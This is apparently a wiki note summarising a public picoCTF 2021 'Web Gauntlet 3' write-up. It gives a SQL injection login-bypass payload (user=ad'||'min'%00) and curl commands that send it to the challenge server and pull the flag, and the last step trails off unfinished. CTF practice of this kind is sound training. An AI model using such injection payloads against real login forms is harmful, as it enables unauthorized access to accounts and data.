---
title: Web Gauntlet 3 — picoCTF 2021 Web Exploitation writeup
created: 2026-06-24
updated: 2026-06-24
type: query
tags: [ctf, picoctf, picoctf2021, web-exploitation, writeup]
sources: [https://raw.githubusercontent.com/HHousen/PicoCTF-2021/master/Web%20Exploitation/Web%20Gauntlet%203/README.md]
confidence: medium
---

# Web Gauntlet 3 — picoCTF 2021 Web Exploitation writeup

## 참고 URL
- [공개 writeup / 원문](https://raw.githubusercontent.com/HHousen/PicoCTF-2021/master/Web%20Exploitation/Web%20Gauntlet%203/README.md)

## 핵심 요약
Last time, I promise! Only 25 characters this time. Log in as admin Site: <http://mercury.picoctf.net:32946/> Filter: <http://mercury.picoctf.net:32946/filter.php>

## 풀이 메모
1. The solution to this challenge is completely identical to my solution to Web Gauntlet 2.
2. The solution query is user=ad'||'min'%00 and it can be sent using cURL like so: curl --data "user=ad'||'min'%00&pass=a" http://mercury.picoctf.net:32946/index.php --cookie "PHPSESSID=n11ugic3f920cjhj6cacohmheg" --output - The flag can be retrieved using this command: curl http://mercury.picoctf.net:32946/filter.php --cookie "PHPSESSID=n11ugic3f920cjhj6cacohmheg" | grep picoCTF. See Web Gauntlet 2 for more information.
3. The code for the filter and the flag are shown in /filter.php when the login is bypassed:

## 같이 보면 좋은 페이지
- [[picoctf-2021-web-exploitation-survey]]
- [[picoctf-2021-web-exploitation-family-hub]]
- [[picoctf-2021-topic-map]]
